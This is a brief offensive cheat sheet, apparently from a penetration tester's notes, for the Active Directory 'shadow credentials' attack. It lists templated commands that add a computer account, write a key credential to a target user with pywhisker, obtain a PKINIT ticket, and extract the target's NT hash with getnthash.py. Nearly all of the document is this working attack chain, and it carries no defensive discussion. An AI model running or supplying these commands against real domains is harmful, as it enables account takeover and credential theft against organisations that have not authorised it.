# Shadow Credentials with Pywhisker

%adcs, ActiveDirectory, shadow, pkinit

## Adding Computer Account
```
addcomputer.py '<DOMAIN>/<USERNAME>':'<PASSWORD>' -method LDAPS -computer-name '<COMPUTER_NAME>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP>
```

## Using Pywhisker
```
python3 pywhisker.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --target <TARGET_USER> --action add
```

## Generate PKINIT TGT
```
python3 gettgtpkinit.py -cert-pfx ../pywhisker/<PFX_VALUE>.pfx -pfx-pass <PFX_PASSWORD> <DOMAIN>/<USERNAME> <USER_CCACHE>.ccache
```

## Using Generated Ticket
```
KRB5CCNAME=<USER_CCACHE>.ccache python3 getnthash.py -key <KEY_VALUE> <DOMAIN>/<USERNAME>
``` 
